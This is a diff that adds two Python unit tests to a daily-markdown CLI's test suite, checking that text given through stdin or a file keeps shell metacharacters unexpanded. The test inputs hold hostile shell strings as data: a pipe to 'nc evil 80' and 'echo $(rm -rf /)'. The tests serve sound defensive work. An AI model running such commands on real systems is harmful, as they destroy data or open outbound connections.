@@ -431,6 +431,49 @@ class DailyMarkdownCliTest(unittest.TestCase):
             )
             self.assertNotEqual(0, result.returncode)
 
+    def test_log_text_via_stdin_preserves_shell_special_chars(self):
+        """P0#6: docs route raw user text through stdin instead of inlining
+        it into a shell-quoted argument. The stdin path must preserve
+        bytes containing $(...), backticks, pipes and newlines unchanged
+        — and never trigger shell expansion (since stdin doesn't go
+        through a shell)."""
+        import subprocess
+        hostile = "innocent $(whoami) `id` | nc evil 80\nsecond line"
+        with tempfile.TemporaryDirectory() as tmp:
+            result = subprocess.run(
+                [sys.executable, str(SCRIPT), "log",
+                 "--text-stdin",
+                 "--time", "08:00", "--title", "fuzz"],
+                input=hostile, capture_output=True, text=True, cwd=tmp,
+                check=True,
+            )
+            log_path = Path(result.stdout.strip())
+            content = log_path.read_text(encoding="utf-8")
+            # All hostile characters survive verbatim (escape_pseudo_h2
+            # only protects ## headings, not these).
+            self.assertIn("$(whoami)", content)
+            self.assertIn("`id`", content)
+            self.assertIn("| nc evil 80", content)
+            # Newline within text is preserved (not collapsed)
+            self.assertIn("second line", content)
+
+    def test_log_text_via_file_input(self):
+        """--text-file alternative: path read by Python, never through
+        the shell. Same byte-preservation expectation."""
+        import subprocess
+        with tempfile.TemporaryDirectory() as tmp:
+            payload = Path(tmp) / "raw.txt"
+            hostile = "echo $(rm -rf /) `whoami`"
+            payload.write_text(hostile, encoding="utf-8")
+            result = subprocess.run(
+                [sys.executable, str(SCRIPT), "log",
+                 "--text-file", str(payload),
+                 "--time", "08:00", "--title", "fuzz-file"],
+                capture_output=True, text=True, cwd=tmp, check=True,
+            )
+            log_path = Path(result.stdout.strip())
+            self.assertIn(hostile, log_path.read_text(encoding="utf-8"))
+
     def test_task_capture_rejects_h2_injection_via_title(self):
         with tempfile.TemporaryDirectory() as tmp:
             result = run_cli(
